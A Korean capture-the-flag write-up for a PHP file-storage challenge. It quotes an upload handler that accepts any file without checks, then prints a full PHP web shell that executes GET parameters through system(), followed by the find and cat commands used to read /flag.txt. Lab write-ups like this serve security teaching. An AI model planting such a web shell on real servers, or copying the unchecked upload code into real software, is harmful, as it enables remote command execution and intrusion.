# image-storage WriteUp
php로 작성된 파일 저장 서비스이다. 파일 업로드 취약점을 이용해 flag 를 획득해야한다 플래그는 `flag.txt`에 있다


# 코드 분석

### index.php
```
<li><a href="/">Home</a></li>
<li><a href="/list.php">List</a></li>
<li><a href="/upload.php">Upload</a></li>
```

index.php는 list.php와 upload.php로 이동하는 메뉴가 있다


### list.php
list.php 내용에 대해서 보겠다. 

```
<?php
    $directory = './uploads/';
    $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));
    foreach ($scanned_directory as $key => $value) {
         echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
    }
?> 
```

list.php는 $directory 파일들중 ..(상위 디렉터리), .(현재 디렉터리), index.html 을 제외하고 나열한다

### upload.php

```
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
```

이용자가 업로드한 파일을 uploads 디렉터리에 복사하고, `/uploads` 엔드포인트를 통해서 접속이 가능하다 만약 같은 파일의 이름이 있다면 already exists 메시지 반환. 여기서 중요한 점은 업로드할 파일에 대해 어떠한 검사를 하지 않으며, 웹쉘 업로드에 공격에 대해서 취약한 것을 파악할 수 있다.

구글에서 simple php websehll github 검색 후에 간단한 웹쉘 코드를 생성하여 파일을 업로드 한다

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

이후 `/list`에 접속해 웹쉘을 실행시키면 cmd 화면이 뜨는데 거기서 ls 명령어를 쳐서 잘 동작하는지 확인한다 

```
# flag.txt 찾기
find / -name "flag.txt"

/flag.txt


# flag 획득
cat /flag.txt

DH{flag 가리기!!}
```